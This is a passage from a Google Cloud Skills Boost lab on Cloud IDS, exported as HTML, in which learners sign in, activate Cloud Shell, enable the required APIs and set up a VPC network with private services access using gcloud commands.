Cloud for the duration of the lab.</span></p><h5 id='what-you-need-4'><span>What you need</span></h5><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li><li><p><span>Time to complete the lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> If you already have your own personal Google Cloud account or project, do not use it for this lab.</span></p><p><strong><span>Note:</span></strong><span> If you are using a Pixelbook, open an Incognito window to run this lab.</span></p><h5 id='how-to-start-your-lab-and-sign-in-to-the-console-3'><span>How to start your lab and sign in to the Console</span></h5><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.</span></p><p><img src="images/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D.png" referrerpolicy="no-referrer" alt="Credentials panel"></p></li><li><p><span>Copy the username, and then click </span><strong><span>Open Google Console</span></strong><span>. The lab spins up resources, and then opens another tab that shows the </span><strong><span>Choose an account</span></strong><span> page.</span></p><p><strong><span>Note:</span></strong><span> Open the tabs in separate windows, side-by-side.</span></p></li><li><p><span>On the Choose an account page, click </span><strong><span>Use Another Account</span></strong><span>. The Sign in page opens.</span></p><p><img src="images/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D.png" referrerpolicy="no-referrer" alt="Choose an account dialog box with Use Another Account option highlighted "></p></li><li><p><span>Paste the username that you copied from the Connection Details panel. Then copy and paste the password.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).</span></p><ol start='' ><li><p><span>Click through the subsequent pages:</span></p></li></ol><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul><p><span>After a few moments, the Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> You can view the menu with a list of Google Cloud Products and Services by clicking the </span><strong><span>Navigation menu</span></strong><span> at the top-left. </span><img src="images/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D.png" referrerpolicy="no-referrer" alt="Cloud Console Menu"></p><h5 id='activate-google-cloud-shell-6'><span>Activate Google Cloud Shell</span></h5><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - &lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><p><span>This lab will all be done using </span><code>gcloud</code><span> CLI commands inside Cloud Shell.</span></p><h4 id='task-1-enable-apis-3'><span>Task 1. Enable APIs</span></h4><p><span>In this task you set the project ID variable and then enable the APIs required for the lab.</span></p><ol start='' ><li><p><span>In Cloud Shell, to set the </span><strong><span>Project_ID</span></strong><span> environment variable, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project | sed '2d')</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Enable the Service Networking API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable servicenetworking.googleapis.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If prompted to authorize the command, click </span><strong><span>Authorize</span></strong><span>.</span></p><ol start='' ><li><p><span>Enable the Cloud IDS API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable ids.googleapis.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Enable the Cloud Logging API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable logging.googleapis.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Enable APIs.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-build-the-google-cloud-networking-footprint-2'><span>Task 2. Build the Google Cloud networking footprint</span></h4><p><span>In this task, you create a Google Cloud VPC network and configure private services access.</span></p><p><span>Private services access is a private connection between your VPC network and a network owned by Google or a third party. Google or the third party, entities who are offering services, are also known as service producers.</span></p><p><span>The private connection enables virtual machine (VM) instances in your VPC network and the services that you access to communicate exclusively by using internal IP addresses.</span></p><ol start='' ><li><p><span>In Cloud Shell, to create a VPC, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create cloud-ids \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet-mode=custom</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If prompted to authorize the command, click </span><strong><span>Authorize</span></strong><span>.</span></p><ol start='' ><li><p><span>Add a subnet to the VPC for mirrored traffic in us-east1:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create cloud-ids-useast1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--range=192.168.10.0/24 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-east1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Configure private services access:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute addresses create cloud-ids-ips \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--global \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--purpose=VPC_PEERING \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--addresses=10.10.10.0 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--prefix-length=24 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--description="Cloud IDS Range" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create a private connection:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 